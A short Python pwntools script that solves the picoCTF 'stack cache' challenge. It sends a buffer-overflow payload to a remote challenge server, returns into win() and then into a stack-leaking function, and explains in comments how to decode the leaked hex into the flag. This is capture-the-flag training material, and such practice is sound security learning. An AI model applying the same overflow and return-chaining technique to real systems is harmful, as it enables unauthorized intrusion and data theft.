from pwn import *

context.binary = elf = ELF('stack cache', checksec=True)
io = remote('saturn.picoctf.net', 59925)

offset_to_fill = 0xA+4  # address of the variable to overflow + 4 instruction pointer
win_addr = elf.symbols['win']
rop = ROP(elf)
ret = (rop.find_gadget(['ret']))[0]
under_construction = elf.symbols['UnderConstruction']

# Because the win() function has no return nor printf, after calling win(), flag will be kept in memory. The way clang-12 works is after function returned, the local vars will not be cleared from the memory, so we can then proceed to call the mem leak function to leak the stack
payload = b'A' * offset_to_fill + p32(win_addr) + p32(ret) + p32(under_construction)
io.sendline(payload)
io.interactive()
# will give you bunch of hex, just put them into hex to ascii. First few will be garbage idk why
